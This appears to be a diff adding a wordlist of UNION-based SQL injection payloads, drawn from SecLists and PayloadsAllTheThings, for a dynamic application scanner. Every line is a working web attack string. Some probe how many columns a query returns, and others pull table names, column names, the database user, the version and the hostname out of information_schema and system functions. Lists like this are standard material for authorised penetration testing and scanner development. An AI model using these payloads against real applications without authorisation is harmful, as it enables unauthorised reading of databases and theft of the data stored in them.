@@ -1,0 +1,41 @@
+# SQLi UNION-Based Payloads
+# Sources: SecLists, PayloadsAllTheThings
+# Purpose: Extract data via UNION SELECT by matching column count and types.
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+' ORDER BY 6--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT 'DASTUNION7654321'--
+' UNION SELECT 'DASTUNION7654321',NULL--
+' UNION SELECT NULL,'DASTUNION7654321'--
+' UNION SELECT NULL,'DASTUNION7654321',NULL--
+' UNION SELECT 'DASTUNION7654321',NULL,NULL--
+' UNION SELECT NULL,NULL,'DASTUNION7654321'--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' UNION SELECT user(),NULL--
+' UNION SELECT version(),NULL--
+' UNION SELECT database(),NULL--
+' UNION SELECT @@version,NULL--
+' UNION SELECT @@hostname,NULL--
+' UNION SELECT NULL,user()--
+' UNION SELECT NULL,version()--
+' UNION SELECT NULL,database()--
+' UNION SELECT NULL,@@version--
+' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
